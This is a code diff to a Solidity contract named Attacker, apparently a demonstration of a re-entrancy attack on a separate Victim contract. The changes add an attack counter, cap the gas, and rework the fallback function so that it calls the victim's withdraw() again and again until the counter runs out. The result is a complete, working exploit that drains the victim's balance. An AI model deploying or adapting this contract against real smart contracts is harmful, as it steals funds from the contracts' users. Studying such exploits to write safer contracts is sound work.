@@ -1,13 +1,16 @@
 pragma solidity >=0.8.0;
 
 import "./Owner.sol";
+import "./Victim.sol";
 
 contract Attacker is Owner {
+    uint256 attackCounter;
     address public victimAddress;
 
     // set the victim address on deployment
-    constructor(address _victimAddress) Owner() {
+    constructor(address _victimAddress, uint256 _attackCounter) Owner() {
         victimAddress = address(_victimAddress);
+        attackCounter = _attackCounter;
     }
 
     // get current Attacker balance on Victim contract
@@ -31,25 +34,24 @@ contract Attacker is Owner {
 
     // perform initial deposit on Victim contract
     function depositToVictim(uint256 _value) external payable {
-        (bool success, ) = victimAddress.call{value: _value, gas: 50000000000}(
+        (bool success, ) = victimAddress.call{value: _value, gas: 65000}(
             abi.encodeWithSignature("deposit()")
         );
-        require(success, "deposited to victim contract with success");
+        require(success, "deposited to victim contract failed");
     }
 
     // perform initial call to Victim contract asking to withdraw funds
     function attack() external payable {
-        (bool success, ) = victimAddress.call{gas: 50000000000}(
-            abi.encodeWithSignature("withdraw()")
-        );
-        require(success, "attack failed");
+        victimAddress.call{gas: 65000}(abi.encodeWithSignature("withdraw()"));
     }
 
     // perform re-entrancy attack on Victim's withdraw function
     fallback() external payable {
-        (bool success, ) = victimAddress.call{gas: 50000000000}(
-            abi.encodeWithSignature("withdraw()")
-        );
-        require(success, "attack failed");
+        if (attackCounter > 0) {
+            victimAddress.call{gas: 65000}(
+                abi.encodeWithSignature("withdraw()")
+            );
+            attackCounter--;
+        }
     }
 }
